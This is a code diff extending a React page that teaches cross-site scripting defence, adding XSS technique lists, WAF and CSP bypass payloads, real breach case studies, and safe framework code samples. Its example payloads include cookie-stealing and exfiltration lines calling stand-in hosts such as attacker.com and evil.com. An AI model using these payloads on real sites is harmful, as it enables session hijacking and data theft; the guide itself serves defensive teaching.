@@ -212,6 +212,169 @@ const frameworkNotes = [
   "Template engines with auto-escape can be bypassed with unsafe flags.",
 ];
 
+// Advanced XSS Techniques
+const advancedTechniques = [
+  {
+    name: "Mutation XSS (mXSS)",
+    description: "Exploits browser HTML parsing quirks where sanitized HTML mutates into executable code when re-parsed",
+    example: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    difficulty: "Advanced",
+  },
+  {
+    name: "Polyglot Payloads",
+    description: "Single payload that works across multiple contexts (HTML, JS, URL, CSS)",
+    example: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A",
+    difficulty: "Advanced",
+  },
+  {
+    name: "Blind XSS",
+    description: "XSS that triggers in a different context than where it's injected (e.g., admin panels)",
+    example: "Payload with external callback: <script src=//attacker.com/hook.js>",
+    difficulty: "Intermediate",
+  },
+  {
+    name: "DOM Clobbering",
+    description: "Using HTML elements with id/name attributes to overwrite DOM properties",
+    example: "<img name=x><img id=y name=x><script>alert(x.y)</script>",
+    difficulty: "Advanced",
+  },
+  {
+    name: "Prototype Pollution to XSS",
+    description: "Exploiting prototype pollution to inject XSS via gadgets in JavaScript libraries",
+    example: "Polluting Object.prototype with innerHTML gadgets",
+    difficulty: "Expert",
+  },
+  {
+    name: "SVG-based XSS",
+    description: "Using SVG elements which support scripting and event handlers",
+    example: "<svg><animate onbegin=alert(1) attributeName=x>",
+    difficulty: "Intermediate",
+  },
+];
+
+// WAF Bypass Techniques
+const wafBypassTechniques = [
+  { technique: "Case Variation", example: "<ScRiPt>alert(1)</sCrIpT>", description: "Mix upper and lowercase" },
+  { technique: "HTML Encoding", example: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", description: "Use HTML entities" },
+  { technique: "Double Encoding", example: "%253Cscript%253E", description: "URL encode twice" },
+  { technique: "Unicode Escapes", example: "<script>\\u0061lert(1)</script>", description: "JS unicode escapes" },
+  { technique: "Null Bytes", example: "<scr%00ipt>alert(1)</script>", description: "Insert null bytes" },
+  { technique: "Tag Variations", example: "<svg/onload=alert(1)>", description: "Use alternative tags" },
+  { technique: "Event Handler Variations", example: "<body onpageshow=alert(1)>", description: "Less common events" },
+  { technique: "Protocol Handlers", example: "<a href=javascript:alert(1)>", description: "javascript: URL scheme" },
+  { technique: "Template Literals", example: "<script>alert`1`</script>", description: "Tagged template literals" },
+  { technique: "Comment Injection", example: "<script>/**/alert(1)/**/</script>", description: "Use comments" },
+];
+
+// Real-world XSS case studies
+const realWorldCases = [
+  {
+    name: "Samy Worm (2005)",
+    platform: "MySpace",
+    type: "Stored XSS",
+    impact: "Over 1 million users infected in 20 hours",
+    description: "Self-propagating XSS worm that added 'Samy is my hero' to profiles and spread via friend connections.",
+  },
+  {
+    name: "Twitter StalkDaily (2009)",
+    platform: "Twitter",
+    type: "Stored XSS",
+    impact: "Hundreds of thousands of tweets posted",
+    description: "Worm that automatically tweeted links and followed accounts when users viewed infected profiles.",
+  },
+  {
+    name: "eBay XSS (2015)",
+    platform: "eBay",
+    type: "Stored XSS",
+    impact: "Credential theft, session hijacking",
+    description: "Attackers injected malicious scripts into product listings to steal buyer credentials.",
+  },
+  {
+    name: "British Airways (2018)",
+    platform: "BA Website",
+    type: "Stored XSS via Magecart",
+    impact: "380,000 payment cards stolen",
+    description: "Malicious script injected to skim payment card data during checkout.",
+  },
+  {
+    name: "Apache JIRA XSS (2019)",
+    platform: "Atlassian JIRA",
+    type: "Stored XSS",
+    impact: "CVE-2019-8451, account takeover",
+    description: "XSS in JIRA issue descriptions allowed attackers to steal admin sessions.",
+  },
+];
+
+// Testing tools
+const xssTestingTools = [
+  { name: "Burp Suite", category: "Proxy", description: "Industry-standard web security testing tool with XSS scanner" },
+  { name: "OWASP ZAP", category: "Proxy", description: "Free, open-source web app scanner with active XSS detection" },
+  { name: "XSStrike", category: "Scanner", description: "Advanced XSS detection with fuzzing and WAF bypass" },
+  { name: "Dalfox", category: "Scanner", description: "Fast parameter analysis and XSS scanning tool" },
+  { name: "XSS Hunter", category: "Callback", description: "Blind XSS detection with screenshot capture" },
+  { name: "BeEF", category: "Framework", description: "Browser Exploitation Framework for post-XSS attacks" },
+  { name: "DOM Invader", category: "Browser", description: "Burp extension for DOM XSS testing" },
+  { name: "Polyglot Generator", category: "Payload", description: "Generate context-agnostic XSS payloads" },
+];
+
+// CSP bypass techniques
+const cspBypassTechniques = [
+  {
+    scenario: "Dangling Markup",
+    description: "When CSP blocks inline scripts but allows forms, inject markup to exfiltrate data",
+    example: "<form action=https://attacker.com><input name=data value='",
+  },
+  {
+    scenario: "JSONP Endpoints",
+    description: "If CSP allows a domain with JSONP, use callback parameter for script execution",
+    example: "<script src='https://allowed.com/jsonp?callback=alert'></script>",
+  },
+  {
+    scenario: "Angular Expression Injection",
+    description: "If Angular is allowed, template expressions can bypass script-src restrictions",
+    example: "{{constructor.constructor('alert(1)')()}}",
+  },
+  {
+    scenario: "Base Tag Injection",
+    description: "Inject base tag to redirect relative script sources to attacker domain",
+    example: "<base href='https://attacker.com/'>",
+  },
+  {
+    scenario: "Script Gadgets",
+    description: "Use existing script functionality in allowed libraries to achieve code execution",
+    example: "Using jQuery's $.globalEval() or similar gadgets",
+  },
+  {
+    scenario: "Object-src Bypass",
+    description: "If object-src is permissive, use plugins like Flash or PDF for script execution",
+    example: "<object data='malicious.swf'></object>",
+  },
+];
+
+// Browser-specific behaviors
+const browserDifferences = [
+  {
+    browser: "Chrome",
+    behavior: "Strict CSP enforcement, removes X-XSS-Protection support",
+    notes: "Best CSP reporting, Trusted Types support",
+  },
+  {
+    browser: "Firefox",
+    behavior: "Strong CSP support, different HTML parsing quirks",
+    notes: "Some mXSS variations work differently",
+  },
+  {
+    browser: "Safari",
+    behavior: "Older JavaScript engine, some CSP gaps",
+    notes: "May have unique DOM parsing behaviors",
+  },
+  {
+    browser: "Edge (Chromium)",
+    behavior: "Same as Chrome for CSP and XSS filtering",
+    notes: "Legacy Edge had different behaviors",
+  },
+];
+
 const codeSamples = [
   {
     title: "Unsafe DOM injection",
@@ -248,6 +411,231 @@ return <div dangerouslySetInnerHTML={{ __html: comment }} />;`,
     language: "javascript",
     code: `import DOMPurify from "dompurify";
 element.innerHTML = DOMPurify.sanitize(html);`,
+  },
+];
+
+// Extended code samples for more scenarios
+const extendedCodeSamples = [
+  {
+    title: "Vue.js Safe vs Unsafe",
+    language: "vue",
+    code: `<!-- Safe: v-text or mustache syntax -->
+<div v-text="userInput"></div>
+<div>{{ userInput }}</div>
+
+<!-- Unsafe: v-html with untrusted input -->
+<div v-html="userInput"></div>
+
+<!-- Safe: v-html with sanitization -->
+<div v-html="sanitize(userInput)"></div>`,
+  },
+  {
+    title: "Angular Safe Patterns",
+    language: "typescript",
+    code: `// Safe: Angular auto-escapes interpolation
+<div>{{ userInput }}</div>
+
+// Unsafe: bypassing sanitization
+constructor(private sanitizer: DomSanitizer) {}
+// Only use bypassSecurityTrust with known-safe values
+html = this.sanitizer.bypassSecurityTrustHtml(untrusted);
+
+// Safe: use sanitizer properly
+import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
+safeHtml: SafeHtml = this.sanitizer.sanitize(
+  SecurityContext.HTML, userInput
+) || '';`,
+  },
+  {
+    title: "Express.js Output Encoding",
+    language: "javascript",
+    code: `const express = require('express');
+const helmet = require('helmet');
+const xss = require('xss');
+
+const app = express();
+
+// Set security headers including CSP
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+    },
+  },
+}));
+
+// Sanitize user input before storing
+app.post('/comment', (req, res) => {
+  const safeComment = xss(req.body.comment);
+  // Store safeComment in database
+});`,
+  },
+  {
+    title: "CSP Header Configuration",
+    language: "http",
+    code: `# Strict CSP with nonces (recommended)
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{random}';
+  style-src 'self' 'nonce-{random}';
+  img-src 'self' data: https:;
+  font-src 'self';
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';
+  frame-ancestors 'none';
+  upgrade-insecure-requests;
+  report-uri /csp-report;
+
+# Report-Only mode for testing
+Content-Security-Policy-Report-Only:
+  default-src 'self';
+  report-uri /csp-report;`,
+  },
+  {
+    title: "DOMPurify Advanced Configuration",
+    language: "javascript",
+    code: `import DOMPurify from 'dompurify';
+
+// Basic sanitization
+const clean = DOMPurify.sanitize(dirty);
+
+// Allow only specific tags
+const restrictive = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+  ALLOWED_ATTR: ['href', 'title'],
+});
+
+// Block dangerous URI schemes
+DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+  if (node.hasAttribute('href')) {
+    const href = node.getAttribute('href');
+    if (!href.startsWith('https://')) {
+      node.removeAttribute('href');
+    }
+  }
+});
+
+// Sanitize for use in specific context
+const forAttribute = DOMPurify.sanitize(input, {
+  ALLOWED_TAGS: [],
+  KEEP_CONTENT: true,
+});`,
+  },
+  {
+    title: "Trusted Types Implementation",
+    language: "javascript",
+    code: `// Enable Trusted Types via CSP header:
+// Content-Security-Policy: require-trusted-types-for 'script'
+
+// Create a policy for HTML sanitization
+if (window.trustedTypes) {
+  const policy = trustedTypes.createPolicy('default', {
+    createHTML: (input) => DOMPurify.sanitize(input),
+    createScriptURL: (input) => {
+      const url = new URL(input, location.origin);
+      if (url.origin === location.origin) {
+        return input;
+      }
+      throw new Error('Untrusted script URL');
+    },
+  });
+
+  // Now innerHTML requires TrustedHTML
+  element.innerHTML = policy.createHTML(userInput);
+}`,
+  },
+  {
+    title: "PostMessage Security",
+    language: "javascript",
+    code: `// Unsafe: accepting messages from any origin
+window.addEventListener('message', (e) => {
+  document.body.innerHTML = e.data; // XSS!
+});
+
+// Safe: validate origin and sanitize data
+window.addEventListener('message', (e) => {
+  // Whitelist allowed origins
+  const allowedOrigins = ['https://trusted.com'];
+  if (!allowedOrigins.includes(e.origin)) {
+    console.warn('Message from untrusted origin:', e.origin);
+    return;
+  }
+
+  // Validate message structure
+  if (typeof e.data !== 'object' || !e.data.type) {
+    return;
+  }
+
+  // Handle specific message types safely
+  if (e.data.type === 'updateText') {
+    element.textContent = String(e.data.text);
+  }
+});`,
+  },
+  {
+    title: "jQuery Safe Patterns",
+    language: "javascript",
+    code: `// Unsafe: creates elements from user input
+$('<div>' + userInput + '</div>').appendTo('body'); // XSS!
+$('#element').html(userInput); // XSS!
+
+// Safe: use text() for untrusted content
+$('#element').text(userInput);
+
+// Safe: create elements properly
+$('<div>').text(userInput).appendTo('body');
+
+// Safe: set attributes safely
+$('<a>')
+  .attr('href', validateUrl(userInput))
+  .text(userInput)
+  .appendTo('body');
+
+// If HTML is needed, sanitize first
+$('#element').html(DOMPurify.sanitize(userInput));`,
+  },
+];
+
+// Exploit scenarios for different contexts
+const exploitScenarios = [
+  {
+    context: "URL Parameter Reflection",
+    vulnerable: "https://site.com/search?q=<script>alert(1)</script>",
+    payload: "<script>alert(document.cookie)</script>",
+    impact: "Session hijacking via reflected XSS",
+  },
+  {
+    context: "JSON Response Injection",
+    vulnerable: "Response: {\"name\": \"<user_input>\"}",
+    payload: "\"></script><script>alert(1)</script>",
+    impact: "Script execution when JSON rendered in HTML",
+  },
+  {
+    context: "SVG File Upload",
+    vulnerable: "Allow SVG uploads rendered in browser",
+    payload: "<svg onload=alert(1)>",
+    impact: "Stored XSS via uploaded images",
+  },
+  {
+    context: "Markdown Renderer",
+    vulnerable: "Markdown with raw HTML enabled",
+    payload: "[Click](javascript:alert(1))",
+    impact: "XSS via markdown link injection",
+  },
+  {
+    context: "Error Page Reflection",
+    vulnerable: "Error: 'user_input' not found",
+    payload: "'/><script>alert(1)</script>",
+    impact: "XSS in error messages",
+  },
+  {
+    context: "PDF Generator",
+    vulnerable: "HTML to PDF with user content",
+    payload: "<script>document.location='https://evil.com/?c='+document.cookie</script>",
+    impact: "Server-side XSS / data exfiltration",
   },
 ];
 
@@ -1280,6 +1668,209 @@ export default function XSSGuidePage() {
           <Typography variant="body2">
             <strong>CSP Tip:</strong> Start with <code>Content-Security-Policy: default-src 'self'</code> and gradually add trusted sources.
           </Typography>
+        </Paper>
+
+        {/* Advanced XSS Techniques */}
+        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>🎯 Advanced XSS Techniques</Typography>
+        <Grid container spacing={2} sx={{ mb: 4 }}>
+          {advancedTechniques.map((tech) => (
+            <Grid item xs={12} md={6} key={tech.name}>
+              <Paper
+                sx={{
+                  p: 2,
+                  height: "100%",
+                  borderRadius: 2,
+                  border: `1px solid ${alpha("#8b5cf6", 0.2)}`,
+                  "&:hover": { borderColor: "#8b5cf6" },
+                }}
+              >
+                <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
+                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6" }}>
+                    {tech.name}
+                  </Typography>
+                  <Chip label={tech.difficulty} size="small" sx={{ fontSize: "0.65rem", height: 20, bgcolor: alpha("#8b5cf6", 0.1), color: "#8b5cf6" }} />
+                </Box>
+                <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                  {tech.description}
+                </Typography>
+                <Box sx={{ p: 1, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.7rem" }}>
+                  {tech.example}
+                </Box>
+              </Paper>
+            </Grid>
+          ))}
+        </Grid>
+
+        {/* WAF Bypass Techniques */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#f59e0b", 0.03), border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+            <WarningIcon sx={{ color: "#f59e0b" }} /> WAF Bypass Techniques
+          </Typography>
+          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
+            Web Application Firewalls can be bypassed using various encoding and obfuscation techniques. These are for authorized testing only.
+          </Typography>
+          <TableContainer>
+            <Table size="small">
+              <TableHead>
+                <TableRow>
+                  <TableCell sx={{ fontWeight: 700 }}>Technique</TableCell>
+                  <TableCell sx={{ fontWeight: 700 }}>Example</TableCell>
+                  <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
+                </TableRow>
+              </TableHead>
+              <TableBody>
+                {wafBypassTechniques.map((row) => (
+                  <TableRow key={row.technique}>
+                    <TableCell sx={{ fontWeight: 600 }}>{row.technique}</TableCell>
+                    <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.example}</TableCell>
+                    <TableCell>{row.description}</TableCell>
+                  </TableRow>
+                ))}
+              </TableBody>
+            </Table>
+          </TableContainer>
+        </Paper>
+
+        {/* Real-World Case Studies */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3 }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+            <WarningIcon sx={{ color: "#ef4444" }} /> Real-World XSS Case Studies
+          </Typography>
+          <Grid container spacing={2}>
+            {realWorldCases.map((case_) => (
+              <Grid item xs={12} md={6} key={case_.name}>
+                <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
+                  <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{case_.name}</Typography>
+                    <Chip label={case_.type} size="small" sx={{ fontSize: "0.6rem", height: 18 }} />
+                  </Box>
+                  <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
+                    Platform: {case_.platform}
+                  </Typography>
+                  <Typography variant="body2" sx={{ mb: 1 }}>{case_.description}</Typography>
+                  <Chip label={case_.impact} size="small" color="error" sx={{ fontSize: "0.65rem" }} />
+                </Paper>
+              </Grid>
+            ))}
+          </Grid>
+        </Paper>
+
+        {/* CSP Bypass Techniques */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+            <ShieldIcon sx={{ color: "#3b82f6" }} /> CSP Bypass Techniques
+          </Typography>
+          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
+            Even strong CSP policies can sometimes be bypassed through misconfigurations or browser quirks.
+          </Typography>
+          <Grid container spacing={2}>
+            {cspBypassTechniques.map((bypass) => (
+              <Grid item xs={12} md={6} key={bypass.scenario}>
+                <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2, height: "100%" }}>
+                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
+                    {bypass.scenario}
+                  </Typography>
+                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                    {bypass.description}
+                  </Typography>
+                  <Box sx={{ p: 1, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.7rem" }}>
+                    {bypass.example}
+                  </Box>
+                </Box>
+              </Grid>
+            ))}
+          </Grid>
+        </Paper>
+
+        {/* XSS Testing Tools */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#22c55e", 0.03) }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+            <SearchIcon sx={{ color: "#22c55e" }} /> XSS Testing Tools
+          </Typography>
+          <Grid container spacing={2}>
+            {xssTestingTools.map((tool) => (
+              <Grid item xs={12} sm={6} md={3} key={tool.name}>
+                <Paper sx={{ p: 2, height: "100%", borderRadius: 2 }}>
+                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{tool.name}</Typography>
+                  <Chip label={tool.category} size="small" sx={{ mt: 0.5, mb: 1, fontSize: "0.6rem" }} color="success" variant="outlined" />
+                  <Typography variant="body2" color="text.secondary">{tool.description}</Typography>
+                </Paper>
+              </Grid>
+            ))}
+          </Grid>
+        </Paper>
+
+        {/* Browser Differences */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3 }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
+            🌐 Browser-Specific Behaviors
+          </Typography>
+          <TableContainer>
+            <Table size="small">
+              <TableHead>
+                <TableRow>
+                  <TableCell sx={{ fontWeight: 700 }}>Browser</TableCell>
+                  <TableCell sx={{ fontWeight: 700 }}>Behavior</TableCell>
+                  <TableCell sx={{ fontWeight: 700 }}>Notes</TableCell>
+                </TableRow>
+              </TableHead>
+              <TableBody>
+                {browserDifferences.map((row) => (
+                  <TableRow key={row.browser}>
+                    <TableCell sx={{ fontWeight: 600 }}>{row.browser}</TableCell>
+                    <TableCell>{row.behavior}</TableCell>
+                    <TableCell>{row.notes}</TableCell>
+                  </TableRow>
+                ))}
+              </TableBody>
+            </Table>
+          </TableContainer>
+        </Paper>
+
+        {/* Extended Code Samples */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3 }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+            <CodeIcon sx={{ color: "#8b5cf6" }} /> Framework-Specific Examples
+          </Typography>
+          <Grid container spacing={2}>
+            {extendedCodeSamples.slice(0, 4).map((sample) => (
+              <Grid item xs={12} md={6} key={sample.title}>
+                <Box sx={{ mb: 1 }}>
+                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
+                    {sample.title}
+                  </Typography>
+                </Box>
+                <CodeBlock code={sample.code} language={sample.language} />
+              </Grid>
+            ))}
+          </Grid>
+        </Paper>
+
+        {/* Exploit Scenarios Table */}
+        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#ef4444", 0.03) }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+            <BugReportIcon sx={{ color: "#ef4444" }} /> Exploit Scenarios by Context
+          </Typography>
+          <TableContainer>
+            <Table size="small">
+              <TableHead>
+                <TableRow>
+                  <TableCell sx={{ fontWeight: 700 }}>Context</TableCell>
+                  <TableCell sx={{ fontWeight: 700 }}>Vulnerable Pattern</TableCell>
+                  <TableCell sx={{ fontWeight: 700 }}>Impact</TableCell>
+                </TableRow>
+              </TableHead>
+              <TableBody>
+                {exploitScenarios.map((row) => (
+                  <TableRow key={row.context}>
+                    <TableCell sx={{ fontWeight: 600 }}>{row.context}</TableCell>
+                    <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.vulnerable}</TableCell>
+                    <TableCell>{row.impact}</TableCell>
+                  </TableRow>
+                ))}
+              </TableBody>
+            </Table>
+          </TableContainer>
         </Paper>
 
         {/* Related */}
